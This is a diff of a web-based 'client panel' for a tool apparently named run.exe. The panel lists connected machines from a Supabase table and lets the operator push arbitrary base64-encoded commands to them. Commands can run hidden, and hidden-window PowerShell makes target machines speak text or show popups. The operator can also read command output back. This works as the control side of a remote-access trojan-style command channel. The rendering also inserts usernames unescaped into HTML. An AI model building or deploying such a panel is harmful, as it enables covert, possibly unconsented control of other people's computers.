@@ -5,305 +5,549 @@
     <title>run.exe client panel</title>
     <style>
         * {
-            padding: 0;
-            margin: 0;
             box-sizing: border-box;
+            margin: 0;
+            padding: 0;
         }
 
         body {
-            background: black;
-            color: white;
-            font-family: monospace;
-            user-select: none;
-            padding: 1rem;
+            background: #0a0a0a;
+            color: #e0e0e0;
+            font-family: 'Consolas', 'Monaco', monospace;
             min-height: 100vh;
+            user-select: none;
+            overflow-x: hidden;
+            line-height: 1.5;
         }
 
-        .user-row {
+        .panel {
+            padding: 2rem;
+            min-height: 100vh;
+            max-width: 1600px;
+            margin: 0 auto;
+        }
+
+        .toolbar {
             display: flex;
             align-items: center;
-            padding: 3px 0;
-            max-width: 250px;
+            justify-content: space-between;
+            margin-bottom: 2rem;
+            padding-bottom: 1rem;
+            border-bottom: 1px solid #222;
         }
 
-        .status-dot {
-            margin-right: 8px;
-        }
-
-        .username-interactive {
-            cursor: pointer;
+        .toolbar-title {
+            font-size: 16px;
+            color: #777;
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
             font-weight: bold;
         }
 
-        .username-interactive:hover {
-            text-decoration: underline;
+        .toolbar-right {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .github-link {
+            color: #555;
+            transition: color 0.2s;
+            display: flex;
+            align-items: center;
+            margin-right: 10px;
+        }
+
+        .github-link:hover {
             color: #fff;
         }
 
-        .spacer {
-            flex-grow: 1;
-            min-width: 20px;
+        .count-badge {
+            font-size: 13px;
+            padding: 4px 10px;
+            border-radius: 4px;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            color: #666;
         }
 
-        .timestamp-static {
-            color: #777;
-            font-size: 0.85em;
+        .count-badge span {
+            color: #e0e0e0;
+            font-weight: bold;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 15px;
+        }
+
+        .user-card {
+            background: #111;
+            border: 1px solid #222;
+            border-radius: 8px;
+            padding: 1.25rem;
+            cursor: default;
+            transition: border-color 0.15s, background 0.15s, transform 0.1s;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .user-card:hover {
+            background: #161616;
+            border-color: #444;
+            transform: translateY(-2px);
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .status-ring {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            flex-shrink: 0;
+        }
+
+        .status-green {
+            background: #2ecc71;
+            box-shadow: 0 0 8px #2ecc7166;
+        }
+
+        .status-yellow {
+            background: #f0c040;
+            box-shadow: 0 0 8px #f0c04066;
+        }
+
+        .status-red {
+            background: #e05050;
+            box-shadow: 0 0 8px #e0505066;
+        }
+
+        .card-username {
+            font-size: 15px;
+            font-weight: bold;
+            color: #fff;
             white-space: nowrap;
-            font-variant-numeric: tabular-nums;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            flex: 1;
         }
 
-        #context-menu {
-            display: none;
+        .card-ts {
+            font-size: 12px;
+            color: #555;
+            height: 18px;
+        }
+
+        .card-actions {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 6px;
+            width: 100%;
+        }
+
+        .card-btn {
+            font-size: 11px;
+            padding: 8px 0;
+            border-radius: 4px;
+            cursor: pointer;
+            background: #1a1a1a;
+            border: 1px solid #2a2a2a;
+            color: #888;
+            font-family: inherit;
+            transition: all 0.1s;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .card-btn:hover {
+            border-color: #666;
+            color: #eee;
+            background: #252525;
+        }
+
+        .card-btn.primary {
+            border-color: #2a4a3a !important;
+            color: #2ecc71 !important;
+            background: #0e1a0e !important;
+        }
+
+        .card-btn.disabled {
+            opacity: 0.15;
+            pointer-events: none;
+        }
+
+        .popup-overlay {
             position: fixed;
-            background-color: #222;
-            border: 1px solid #555;
+            inset: 0;
             z-index: 100;
-            min-width: 250px;
-            box-shadow: 5px 5px 15px rgba(0, 0, 0, 0.5);
+            background: rgba(0, 0, 0, 0.85);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(4px);
         }
 
-        .context-menu-item {
+        .popup-overlay.open {
+            display: flex;
+        }
+
+        .popup-box {
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 12px;
+            padding: 2rem;
+            min-width: 450px;
+            max-width: 600px;
+            width: 95%;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8);
+        }
+
+        .popup-header {
             display: flex;
             justify-content: space-between;
-            align-items: center;
-            padding: 6px 12px;
-            font-size: 12px;
+            align-items: baseline;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #222;
+            padding-bottom: 12px;
+        }
+
+        .popup-title {
+            font-size: 13px;
+            color: #888;
+            letter-spacing: 0.15em;
+            text-transform: uppercase;
+        }
+
+        .popup-target {
+            color: #2ecc71;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .popup-input {
+            width: 100%;
+            background: #050505;
+            border: 1px solid #333;
+            border-radius: 6px;
+            color: #2ecc71;
+            font-family: inherit;
+            font-size: 15px;
+            padding: 15px;
+            outline: none;
+            resize: vertical;
+            margin-bottom: 20px;
+        }
+
+        .option-row {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .opt-btn {
+            flex: 1;
+            background: #1a1a1a;
+            border: 1px solid #2a2a2a;
+            padding: 8px;
+            color: #444;
+            font-size: 11px;
+            font-weight: bold;
+            font-family: inherit;
             cursor: pointer;
-            transition: background 0.2s;
+            border-radius: 4px;
+            transition: 0.2s;
+            text-transform: uppercase;
         }
 
-        .context-menu-item:hover {
-            background: #444;
+        .opt-btn.active {
+            border-color: #2ecc71;
+            color: #2ecc71;
+            background: #0e1a0e;
         }
 
-        .context-menu-item .right {
+        .popup-footer {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            border-top: 1px solid #222;
+            padding-top: 20px;
+        }
+
+        .popup-actions {
+            display: flex;
+            gap: 12px;
+        }
+
+        .popup-btn {
+            font-size: 13px;
+            padding: 10px 18px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-family: inherit;
+            border: 1px solid #333;
+            background: #1a1a1a;
+            color: #aaa;
+            font-weight: bold;
             display: flex;
             align-items: center;
             gap: 8px;
         }
 
-        .eye-toggle {
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-        }
-
-        .divider {
-            border-top: 1px solid #444;
-            margin: 2px 0;
-        }
-
-        .hint {
-            color: #888;
-            font-size: 0.85em;
-            padding: 1px 5px;
-            background-color: #333;
+        /* Inline Key Hint Styling */
+        .btn-hint {
+            font-size: 10px;
+            background: #2a2a2a;
+            color: #666;
+            padding: 2px 6px;
             border-radius: 3px;
+            text-transform: uppercase;
+            font-weight: normal;
         }
 
-        .link-actions {
-            position: fixed;
-            right: 10px;
-            bottom: 10px;
-            z-index: 1;
-            margin: 1rem;
+        .popup-btn.confirm {
+            border-color: #2a4a3a;
+            color: #2ecc71;
+            background: #0e1a0e;
         }
 
-        .link-actions img {
-            display: block;
-            filter: invert(1);
+        .popup-btn.confirm .btn-hint {
+            background: #16261c;
+            color: #2ecc7199;
+        }
+
+        .popup-btn:hover {
+            background: #222;
+            color: #fff;
+        }
+
+        .empty {
+            color: #333;
+            text-align: center;
+            padding: 100px 0;
+            font-size: 16px;
+            letter-spacing: 2px;
         }
     </style>
 </head>
 
 <body>
 
-    <div id="user-list"></div>
-
-    <div id="context-menu">
-        <div class="context-menu-item" id="menu-send-cmd">
-            <span>Send Command</span>
-            <div class="right">
-                <span class="eye-toggle" id="menu-eye-toggle" title="Toggle CMD visibility">
-                    <svg id="eye-icon-visible" xmlns="http://www.w3.org/2000/svg" width="12" height="12"
-                        viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
+    <div class="panel" id="app">
+        <div class="toolbar">
+            <span class="toolbar-title">run.exe // client panel</span>
+            <div class="toolbar-right">
+                <a href="https://github.com/yuan-miranda/run" target="_blank" class="github-link">
+                    <svg height="20" width="20" viewBox="0 0 16 16" fill="currentColor">
                         <path
-                            d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0" />
-                        <circle cx="12" cy="12" r="3" />
+                            d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
+                        </path>
                     </svg>
-                    <svg id="eye-icon-hidden" xmlns="http://www.w3.org/2000/svg" width="12" height="12"
-                        viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round" style="display:none;">
-                        <path
-                            d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49" />
-                        <path d="M14.084 14.158a3 3 0 0 1-4.242-4.242" />
-                        <path
-                            d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143" />
-                        <path d="m2 2 20 20" />
-                    </svg>
-                </span>
-                <span class="hint">C</span>
+                </a>
+                <span class="count-badge">online: <span id="online-count">0</span></span>
+                <span class="count-badge">total: <span id="total-count">0</span></span>
             </div>
         </div>
-
-        <div class="context-menu-item" id="menu-view-output">
-            <span>View Output (col)</span>
-            <span class="hint">V</span>
-        </div>
-
-        <div class="divider"></div>
-
-        <div class="context-menu-item" id="menu-voice-chat">
-            <span>Voice Chat</span>
-            <span class="hint">S / ⇧S</span>
-        </div>
-
-        <div class="context-menu-item" id="menu-message-box">
-            <span>Message Box</span>
-            <span class="hint">A</span>
+        <div class="grid" id="user-grid">
+            <div class="empty">initializing connection...</div>
         </div>
     </div>
 
-    <div class="link-actions">
-        <a href="https://github.com/yuan-miranda/run" target="_blank" aria-label="GitHub Repository">
-            <img src="github-mark.svg" alt="GitHub" width="32" height="32" title="GitHub Repository">
-        </a>
+    <div class="popup-overlay" id="popup-overlay">
+        <div class="popup-box">
+            <div class="popup-header">
+                <span class="popup-title" id="popup-mode-label">COMMAND</span>
+                <span class="popup-target" id="popup-target-label">TARGET_USER</span>
+            </div>
+
+            <textarea class="popup-input" id="popup-input" rows="4" placeholder="Enter payload or text..."></textarea>
+
+            <div id="vis-section" style="display:none;" class="option-row">
+                <button class="opt-btn" id="vis-true">Visible</button>
+                <button class="opt-btn" id="vis-false">Hidden</button>
+            </div>
+
+            <div id="voice-section" style="display:none;" class="option-row">
+                <button class="opt-btn" id="voice-david">David</button>
+                <button class="opt-btn" id="voice-zira">Zira</button>
+            </div>
+
+            <div class="popup-footer">
+                <div class="popup-actions">
+                    <button class="popup-btn" id="popup-cancel">
+                        Cancel <span class="btn-hint">ESC</span>
+                    </button>
+                    <button class="popup-btn confirm" id="popup-confirm">
+                        Send <span class="btn-hint">CTRL+ENTER</span>
+                    </button>
+                </div>
+            </div>
+        </div>
     </div>
 
     <script>
         const state = {
             rows: [],
-            showMenu: false,
-            targetUser: null,
             url: localStorage.getItem('supa_url'),
             apiKey: localStorage.getItem('supa_key'),
+            popupMode: null,
+            popupUser: null,
+            hoveredUser: null,
+            selectedVoice: 'David',
+            selectedVis: true
         };
 
         const $ = id => document.getElementById(id);
 
-        function init() {
-            if (!state.url || state.url === 'null' || !state.apiKey || state.apiKey === 'null') {
-                const u = prompt('Enter Supabase URL:');
-                const k = prompt('Enter Supabase API Key:');
-                if (!u || !k) {
-                    alert('Both URL and API Key are required!');
-                    location.reload();
-                    return;
-                }
-                state.url = u;
-                state.apiKey = k;
-                localStorage.setItem('supa_url', u);
-                localStorage.setItem('supa_key', k);
-            }
-            fetchData();
-            setInterval(fetchData, 4000);
-            setupMenu();
-            setupKeyboard();
-        }
+        document.addEventListener('contextmenu', e => e.preventDefault());
 
-        function formatDate(isoString) {
-            if (!isoString) return "--/--/---- --:--:--";
-            return new Date(isoString).toLocaleString();
-        }
-
-        function getStatusColor(user) {
+        function getStatus(user) {
             const diff = (Date.now() - new Date(user.updated_at).getTime()) / 1000;
             if (diff < 10) return 'green';
             if (diff < 60) return 'yellow';
             return 'red';
         }
 
-        function sortedRows() {
-            const order = { green: 0, yellow: 1, red: 2 };
-            return [...state.rows].sort((a, b) => {
-                const diff = order[getStatusColor(a)] - order[getStatusColor(b)];
-                return diff !== 0 ? diff : a.username.localeCompare(b.username);
-            });
+        function updateOptionsUI() {
+            $('voice-david').className = 'opt-btn' + (state.selectedVoice === 'David' ? ' active' : '');
+            $('voice-zira').className = 'opt-btn' + (state.selectedVoice === 'Zira' ? ' active' : '');
+            $('vis-true').className = 'opt-btn' + (state.selectedVis ? ' active' : '');
+            $('vis-false').className = 'opt-btn' + (!state.selectedVis ? ' active' : '');
         }
 
-        function renderList() {
-            const list = $('user-list');
-            list.innerHTML = '';
-            for (const user of sortedRows()) {
-                const row = document.createElement('div');
-                row.className = 'user-row';
+        function renderGrid() {
+            const grid = $('user-grid');
+            const sorted = [...state.rows].sort((a, b) => {
+                const order = { green: 0, yellow: 1, red: 2 };
+                return order[getStatus(a)] - order[getStatus(b)] || a.username.localeCompare(b.username);
+            });
 
-                const dot = document.createElement('span');
-                dot.className = 'status-dot';
-                dot.style.color = getStatusColor(user);
-                dot.textContent = '●';
+            $('online-count').textContent = sorted.filter(u => getStatus(u) === 'green').length;
+            $('total-count').textContent = sorted.length;
 
-                const name = document.createElement('span');
-                name.className = 'username-interactive';
-                name.textContent = user.username;
-                name.addEventListener('mouseenter', () => { if (!state.showMenu) state.targetUser = user; });
-                name.addEventListener('mouseleave', () => { if (!state.showMenu) state.targetUser = null; });
-                name.addEventListener('contextmenu', e => { e.preventDefault(); openMenu(e, user); });
-
-                const spacer = document.createElement('div');
-                spacer.className = 'spacer';
-
-                const ts = document.createElement('span');
-                ts.className = 'timestamp-static';
-                ts.textContent = formatDate(user.updated_at);
-
-                row.appendChild(dot);
-                row.appendChild(name);
-                row.appendChild(spacer);
-                row.appendChild(ts);
-                list.appendChild(row);
+            if (!sorted.length) {
+                grid.innerHTML = '<div class="empty">NO CLIENTS CONNECTED</div>';
+                return;
             }
-        }
 
-        function openMenu(e, user) {
-            state.targetUser = user;
-            state.showMenu = true;
+            grid.innerHTML = '';
+            sorted.forEach(user => {
+                const status = getStatus(user);
+                const alive = status === 'green';
+                const card = document.createElement('div');
+                card.className = 'user-card';
+                const tsText = alive ? '' : `Last seen: ${new Date(user.updated_at).toLocaleTimeString()}`;
 
-            const menu = $('context-menu');
-            menu.style.display = 'block';
-            menu.style.top = e.clientY + 'px';
-            menu.style.left = e.clientX + 'px';
+                card.innerHTML = `
+                    <div class="card-header">
+                        <div class="status-ring status-${status}"></div>
+                        <span class="card-username">${user.username}</span>
+                    </div>
+                    <div class="card-ts">${tsText}</div>
+                    <div class="card-actions">
+                        <button class="card-btn primary ${alive ? '' : 'disabled'}" data-action="cmd">CMD</button>
+                        <button class="card-btn ${alive ? '' : 'disabled'}" data-action="speak">SPK</button>
+                        <button class="card-btn ${alive ? '' : 'disabled'}" data-action="popup_msg">MSG</button>
+                        <button class="card-btn" data-action="output">OUT</button>
+                    </div>
+                `;
 
-            updateEyeIcon(user);
-        }
+                card.addEventListener('mouseenter', () => state.hoveredUser = user);
+                card.addEventListener('mouseleave', () => state.hoveredUser = null);
 
-        function closeMenu() {
-            state.showMenu = false;
-            $('context-menu').style.display = 'none';
-        }
-
-        function updateEyeIcon(user) {
-            const eyeToggle = $('menu-eye-toggle');
-            eyeToggle.style.color = user?.visible ? 'white' : 'gray';
-            $('eye-icon-visible').style.display = user?.visible ? 'inline' : 'none';
-            $('eye-icon-hidden').style.display = user?.visible ? 'none' : 'inline';
-        }
-
-        function setupMenu() {
-            document.addEventListener('contextmenu', e => e.preventDefault());
-            document.addEventListener('click', e => {
-                if (!$('context-menu').contains(e.target)) closeMenu();
-            });
-
-            $('menu-send-cmd').addEventListener('click', () => { fetchSingle(state.targetUser); closeMenu(); });
-            $('menu-view-output').addEventListener('click', () => { viewOutput(state.targetUser); closeMenu(); });
-            $('menu-voice-chat').addEventListener('click', () => quickCommand('speak'));
-            $('menu-message-box').addEventListener('click', () => quickCommand('popup'));
-            $('menu-eye-toggle').addEventListener('click', e => {
-                e.stopPropagation();
-                toggleVisibility(state.targetUser);
+                card.addEventListener('click', e => {
+                    const action = e.target.dataset.action;
+                    if (!action) return;
+                    if (action === 'cmd') openPopup('cmd', user);
+                    if (action === 'speak') openPopup('speak', user);
+                    if (action === 'popup_msg') openPopup('popup_msg', user);
+                    if (action === 'output') doViewOutput(user);
+                });
+                grid.appendChild(card);
             });
         }
 
-        function setupKeyboard() {
-            document.addEventListener('keydown', e => {
-                if (!state.targetUser) return;
-                if (e.key === 'c' || e.key === 'C') fetchSingle(state.targetUser);
-                if (e.key === 'v' || e.key === 'V') viewOutput(state.targetUser);
-                if (e.key === 's' || e.key === 'S') quickCommand('speak', e);
-                if (e.key === 'a' || e.key === 'A') quickCommand('popup');
-            });
+        function openPopup(mode, user) {
+            state.popupMode = mode;
+            state.popupUser = user;
+            state.selectedVis = user.visible;
+
+            $('popup-input').value = '';
+            $('popup-target-label').textContent = user.username;
+            $('popup-overlay').classList.add('open');
+
+            $('vis-section').style.display = (mode === 'cmd') ? 'flex' : 'none';
+            $('voice-section').style.display = (mode === 'speak') ? 'flex' : 'none';
+
+            if (mode === 'cmd') $('popup-mode-label').textContent = 'Execute Command';
+            else if (mode === 'speak') $('popup-mode-label').textContent = 'Voice Message';
+            else $('popup-mode-label').textContent = 'Message Box';
+
+            updateOptionsUI();
+            setTimeout(() => $('popup-input').focus(), 50);
+        }
+
+        function closePopup() {
+            $('popup-overlay').classList.remove('open');
+            state.popupMode = null;
+            state.popupUser = null;
+        }
+
+        function formatPSString(str) {
+            const escaped = str.replace(/'/g, "''");
+            return escaped.split(/\r?\n/).map(line => `'${line}'`).join(' + [char]13 + ');
+        }
+
+        async function doSendPopup() {
+            const user = state.popupUser;
+            const mode = state.popupMode;
+            const val = $('popup-input').value.trim();
+            if (!user) return;
+
+            let rawCmd = '';
+            if (val) {
+                if (mode === 'cmd') rawCmd = val;
+                else if (mode === 'speak') {
+                    const msg = formatPSString(val);
+                    rawCmd = `powershell -W H -C "$s=New-Object -Com SAPI.SpVoice;$s.Voice=$s.GetVoices()|Where-Object{$_.GetDescription() -like '*${state.selectedVoice}*'};$s.Speak(${msg})"`;
+                } else {
+                    const msg = formatPSString(val);
+                    rawCmd = `powershell -W H -C "(New-Object -Com WScript.Shell).Popup(${msg})"`;
+                }
+            }
+
+            const body = {};
+            if (rawCmd) { body.cmd = btoa(rawCmd); body.run = true; }
+            if (mode === 'cmd') body.visible = state.selectedVis;
+
+            try {
+                await fetch(`${state.url}?username=eq.${user.username}`, {
+                    method: 'PATCH',
+                    headers: { apikey: state.apiKey, Authorization: `Bearer ${state.apiKey}`, 'Content-Type': 'application/json' },
+                    body: JSON.stringify(body)
+                });
+                closePopup();
+                fetchData();
+            } catch (e) { console.error("Trans Error", e); }
+        }
+
+        async function doViewOutput(user) {
+            try {
+                const res = await fetch(`${state.url}?select=out&username=eq.${user.username}`, {
+                    headers: { apikey: state.apiKey, Authorization: `Bearer ${state.apiKey}` }
+                });
+                const data = await res.json();
+                if (data[0]?.out) {
+                    const decoded = atob(data[0].out);
+                    navigator.clipboard.writeText(decoded).catch(() => { });
+                    alert(decoded);
+                }
+            } catch (e) { console.error(e); }
         }
 
         async function fetchData() {
@@ -312,81 +556,61 @@
                     headers: { apikey: state.apiKey, Authorization: `Bearer ${state.apiKey}` }
                 });
                 state.rows = await res.json();
-                renderList();
-            } catch (err) { console.error(err); }
+                renderGrid();
+            } catch (e) { console.error(e); }
         }
 
-        async function toggleVisibility(user) {
-            const newState = !user.visible;
-            user.visible = newState;
-            updateEyeIcon(user);
-            try {
-                await fetch(`${state.url}?username=eq.${user.username}`, {
-                    method: 'PATCH',
-                    headers: {
-                        apikey: state.apiKey,
-                        Authorization: `Bearer ${state.apiKey}`,
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ visible: newState })
-                });
-            } catch (err) {
-                console.error(err);
-                user.visible = !newState;
-                updateEyeIcon(user);
-            }
-        }
-
-        function fetchSingle(user) {
-            closeMenu();
-            if (getStatusColor(user) !== 'green') return;
-            const cmd = prompt(`Send command to ${user.username}:`);
-            if (cmd) sendCommand(user.username, btoa(cmd));
-        }
-
-        async function viewOutput(user) {
-            closeMenu();
-            try {
-                const res = await fetch(`${state.url}?select=out&username=eq.${user.username}`, {
-                    headers: { apikey: state.apiKey, Authorization: `Bearer ${state.apiKey}` }
-                });
-                const data = await res.json();
-                if (data[0]?.out) {
-                    const decoded = atob(data[0].out);
-                    await navigator.clipboard.writeText(decoded);
-                    alert(decoded);
+        function init() {
+            if (!state.url || !state.apiKey) {
+                const u = prompt('Supabase URL:');
+                const k = prompt('API Key:');
+                if (u && k) {
+                    state.url = u; state.apiKey = k;
+                    localStorage.setItem('supa_url', u);
+                    localStorage.setItem('supa_key', k);
                 }
-            } catch (err) { console.error(err); }
-        }
+            }
 
-        function quickCommand(type, e = null) {
-            const user = state.targetUser;
-            closeMenu();
-            if (getStatusColor(user) !== 'green') return;
+            fetchData();
+            setInterval(fetchData, 4000);
 
-            const voiceType = (e && e.shiftKey) ? 'Zira' : 'David';
-            let msg = prompt(`Enter message to ${type === 'speak' ? `speak with ${voiceType} voice` : 'display as a popup'} for ${user.username}:`);
-            if (!msg) return;
+            $('voice-david').onclick = () => { state.selectedVoice = 'David'; updateOptionsUI(); };
+            $('voice-zira').onclick = () => { state.selectedVoice = 'Zira'; updateOptionsUI(); };
+            $('vis-true').onclick = () => { state.selectedVis = true; updateOptionsUI(); };
+            $('vis-false').onclick = () => { state.selectedVis = false; updateOptionsUI(); };
 
-            msg = msg.replace(/'/g, "''");
-            const rawCmd = type === 'speak'
-                ? `powershell -W H -C "$s=New-Object -Com SAPI.SpVoice;$s.Voice=$s.GetVoices()|Where-Object{$_.GetDescription() -like '*${voiceType}*'};$s.Speak('${msg}')"`
-                : `powershell -W H -C "(New-Object -Com WScript.Shell).Popup('${msg}')"`;
-            sendCommand(user.username, btoa(rawCmd));
-        }
+            document.addEventListener('keydown', e => {
+                if (state.popupMode) {
+                    if (e.key === 'Escape') closePopup();
+                    if (e.key === 'Shift' && document.activeElement !== $('popup-input')) {
+                        if (state.popupMode === 'speak') {
+                            state.selectedVoice = (state.selectedVoice === 'David' ? 'Zira' : 'David');
+                        } else if (state.popupMode === 'cmd') {
+                            state.selectedVis = !state.selectedVis;
+                        }
+                        updateOptionsUI();
+                    }
+                    return;
+                }
+                const u = state.hoveredUser;
+                if (!u) return;
+                const alive = getStatus(u) === 'green';
+                const key = e.key.toLowerCase();
+                if (key === 'c' && alive) openPopup('cmd', u);
+                if (key === 's' && alive) {
+                    state.selectedVoice = e.shiftKey ? 'Zira' : 'David';
+                    openPopup('speak', u);
+                }
+                if (key === 'a' && alive) openPopup('popup_msg', u);
+                if (key === 'v') doViewOutput(u);
+            });
 
-        async function sendCommand(username, b64Cmd) {
-            await fetch(`${state.url}?username=eq.${username}`, {
-                method: 'PATCH',
-                headers: {
-                    apikey: state.apiKey,
-                    Authorization: `Bearer ${state.apiKey}`,
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ cmd: b64Cmd, run: true })
+            $('popup-cancel').onclick = closePopup;
+            $('popup-confirm').onclick = doSendPopup;
+            $('popup-input').addEventListener('keydown', e => {
+                if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) doSendPopup();
             });
         }
-
         init();
     </script>
 </body>
